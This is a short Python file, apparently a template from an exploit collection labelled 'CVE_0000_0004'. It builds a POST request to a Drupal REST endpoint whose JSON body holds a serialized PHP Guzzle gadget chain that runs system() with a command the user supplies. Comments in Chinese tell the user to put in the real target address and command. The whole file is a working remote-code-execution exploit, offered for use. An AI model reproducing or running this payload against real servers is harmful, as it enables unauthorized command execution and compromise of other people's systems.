# CVE_0000_0004
import json

def build(ip_port: str, cmd: str):
    url = "/node/?_format=hal_json"

    headers = {
        "Host": ip_port,  # 将占位符替换为实际目标
        "Content-Type": "application/hal+json",
    }
    body = """{\n  "link": [\n    {\n      "value": "link",\n      "options": "O:24:\\"GuzzleHttp\\\\Psr7\\\\FnStream\\":2:{s:33:\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\";a:1:{s:5:\\"close\\";a:2:{i:0;O:23:\\"GuzzleHttp\\\\HandlerStack\\":3:{s:32:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\";s:2:\\"id\\";s:30:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\";a:1:{i:0;a:1:{i:0;s:6:\\"system\\";}}s:31:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\";b:0;}i:1;s:7:\\"resolve\\";}}s:9:\\"_fn_close\\";a:2:{i:0;r:4;i:1;s:7:\\"resolve\\";}}"\n    }\n  ],\n  "_links": {\n    "type": {\n      "href": "http://192.168.159.133/rest/type/shortcut/default"\n    }\n  }\n}"""

    # 注意：按需替换IP端口和命令
    cmd_len = len(cmd)
    body = body.replace('{ip_port}', ip_port)
    body = body.replace('s:2:\\"id\\"', f's:{cmd_len}:\\"{cmd}\\"')
    body = body.replace("192.168.159.133", ip_port)  # 替换示例 Host

    return {
        "method": "POST",
        "url": f"{url}",
        "headers": headers,
        "data": body,
    }
